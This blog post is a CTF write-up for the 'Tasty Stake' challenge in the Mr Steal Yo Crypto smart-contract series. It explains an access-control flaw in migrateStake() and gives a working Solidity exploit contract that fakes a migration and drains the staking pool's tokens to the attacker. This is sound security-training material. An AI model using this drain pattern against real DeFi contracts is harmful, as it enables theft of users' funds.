---
title: "Mr Steal Yo Crypto — Tasty Stake"
date: 2023-07-22
draft: false
description: "CTF - 6"
tags: ["CTF"]
series: ["CTF"]
series_order: 6
topics: ["CTF"]
showAuthor: false
showAuthorsBadges : false
---

This is the #6 challenge of [Mr Steal Yo Crypto](https://mrstealyocrypto.xyz/index.html). I will try to explain how to find the vulnerability.

> A set of challenges to learn offensive security of smart contracts. Featuring interesting challenges loosely (or directly) inspired by real-world exploits.

Created by [@0xToshii](https://twitter.com/0xToshii)

I used the foundry version for this CTF: [mr-steal-yo-crypto-ctf-foundry](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement).

![Mr Steal Yo Crypto](https://cdn-images-1.medium.com/max/800/1*67w9ffBxLP4AMvoxHowZ2w.jpeg)

## Tasty Stake

[redacted] labs have released their TastyStaking contract, which allows you to stake STEAK in order to farm BUTTER tokens.

Your task is to drain all of the STEAK tokens from the staking contract.

- [See the contracts](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement/src/tasty-stake)
- [Complete the challenge](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/6-tasty-stake.sol)

### Review of the contract

#### TastyStaking.sol

There are a lot of functions inside this contract. I will only check the public/external function (except getters):

- `setRewardDistributor()`, `addReward()`, `setMigrator()`: No issues due to the modifier `onlyOwner`.
- `stake()`, `stakeAll()`, `stakeFor()`, `withdraw()`, `withdrawAll()`: No issues.
- `migrateWithdraw()`: No problem with the modifier `onlyMigrator`.
- `migrateStake()`: Wait, there is no modifier for checking who is allowed to call this function!? Well, I think we can complete the challenge now.

## Exploit the vulnerability

This is the same vulnerability as the challenge #2 — Safu Vault.

```solidity
/**
* @notice For migrations to a new staking contract:
*         1. User/DApp checks if the user has a balance in the `oldStakingContract`
*         2. If yes, user calls this function `newStakingContract.migrateStake(oldStakingContract, balance)`
*         3. Staking balances are migrated to the new contract, user will start to earn rewards in the new contract.
*         4. Any claimable rewards in the old contract are sent directly to the user's wallet.
* @param oldStaking The old staking contract funds are being migrated from.
* @param amount The amount to migrate - generally this would be the staker's balance
*/
function migrateStake(address oldStaking, uint256 amount) external {
    TastyStaking(oldStaking).migrateWithdraw(msg.sender, amount);
    _applyStake(msg.sender, amount);
}
```

We can create a contract that contains the function `migrateWithdraw()` and when someone called the function, it will return true. We are able to "stake" any amount without sending anything.

Here is a quick solution:

```solidity
contract Exploit {
    address owner;
    TastyStaking _tastyStaking;
    Token stakingToken;

    constructor(address _target, address _stakingToken) {
        owner = msg.sender;
        _tastyStaking = TastyStaking(_target);
        stakingToken = Token(_stakingToken);
    }

    // TastStaking contract will call this function and then increase our balance
    function migrateWithdraw(address staker, uint256 amount) external {
        // Exploit logic here (return true or whatever is needed)
    }

    // migrateStake() will call migrateWithdraw of our contract and not from the tastStaking contract and so we skip the check
    // We can choose the parameter address oldStaking so we can put our contract address
    function pwn() external {
        _tastyStaking.migrateStake(address(this), stakingToken.balanceOf(address(_tastyStaking)));
        _tastyStaking.withdrawAll(false);
        stakingToken.transfer(owner, stakingToken.balanceOf(address(this)));
    }
}
```

You can check my test file [here](https://github.com/gp-ngmi/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/6-tasty-stake.sol).

## Acknowledgement

Thank you [https://stermi.xyz/](https://stermi.xyz/) for inspiring me to write articles on CTF ^^.